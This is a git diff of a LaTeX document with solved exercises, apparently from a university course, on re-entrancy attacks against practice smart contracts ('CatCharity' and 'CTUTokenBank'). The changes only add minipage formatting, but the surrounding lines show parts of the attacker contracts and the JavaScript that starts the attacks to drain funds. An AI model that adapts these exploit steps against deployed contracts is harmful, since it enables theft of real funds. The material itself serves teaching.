@@ -92,6 +92,8 @@ The solved exercise 5 can be found in this \href{https://gitlab.fel.cvut.cz/rado
   \item This attack continues until the charity's balance is completely drained, and the funds are transferred to the attacker.
 \end{enumerate}
 
+\noindent
+\begin{minipage}{\textwidth}
 \begin{lstlisting}[language=Solidity]
 contract CatAttacker {
     CatCharity public catCharity;
@@ -127,9 +129,13 @@ contract CatAttacker {
     }
 }
 \end{lstlisting}
+\end{minipage}
 
 \noindent
 JavaScript code to start the attack:
+
+\noindent
+\begin{minipage}{\textwidth}
 \begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
 // 1) The player deploys the Attacker contract
 catAttacker = await (await ethers.getContractFactory("CatAttacker", deployer))
@@ -141,6 +147,7 @@ await catAttacker.connect(player).attack({ value: 5n * 10n ** 17n });
 // By the end of this transaction, the attacker contract's fallback
 // will keep calling `claimRefund()` in a loop until the charity is drained.
 \end{minted}
+\end{minipage}
 
 \subsection*{Task 2: CTU Token Bank}
 
@@ -152,6 +159,8 @@ In this task, the objective is to exploit a cross-function re-entrancy vulnerabi
     \item Finally, the attacker withdraws all remaining funds and transfers the stolen Ether to themselves.
 \end{enumerate}
 
+\noindent
+\begin{minipage}{\textwidth}
 \begin{lstlisting}[language=Solidity]
   /**
   * @title CTUTokenBankAttacker
@@ -211,9 +220,13 @@ In this task, the objective is to exploit a cross-function re-entrancy vulnerabi
  
  }
 \end{lstlisting}
+\end{minipage}
 
 \noindent
 JavaScript code to start the attack:
+
+\noindent
+\begin{minipage}{\textwidth}
 \begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
 // Deploy the attack contract
 const attackerContractFactory = 
@@ -223,5 +236,6 @@ const attackerContract =
 // Execute the attack with 5 Ethers
 await attackerContract.attack({ value: 5n * 10n ** 18n });
 \end{minted}
+\end{minipage}
 
 \end{document}
